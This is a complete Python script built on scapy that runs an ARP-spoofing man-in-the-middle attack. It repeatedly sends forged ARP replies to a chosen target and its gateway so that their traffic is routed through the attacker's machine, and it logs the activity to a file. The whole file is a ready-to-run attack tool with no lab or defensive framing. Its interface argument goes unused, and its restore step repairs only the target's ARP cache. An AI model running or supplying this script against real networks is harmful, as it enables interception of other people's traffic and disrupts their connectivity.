from scapy.all import *
import sys
import time
import logging

class MITMAttacker:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.logger = self._setup_logger()
        
    def _setup_logger(self):
        logging.basicConfig(
            filename='mitm_attack.log',
            level=logging.INFO,
            format='%(asctime)s - %(message)s'
        )
        return logging.getLogger(__name__)
    
    def get_mac(self, ip):
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0)[0]
        return result[0][1].hwsrc if result else None
    
    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip
            )
            send(packet, verbose=False)
            self.logger.info(f"Sent ARP spoof to {target_ip}")
    
    def start_attack(self):
        try:
            print("[*] Starting MITM attack...")
            while True:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
            self.restore()
            
    def restore(self):
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        if target_mac and gateway_mac:
            packet = ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=gateway_mac
            )
            send(packet, verbose=False)
            self.logger.info("ARP tables restored")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 mitm_attack.py <target_ip> <gateway_ip> <interface>")
        sys.exit(1)
        
    attacker = MITMAttacker(sys.argv[1], sys.argv[2], sys.argv[3])
    attacker.start_attack()

if __name__ == "__main__":
    main()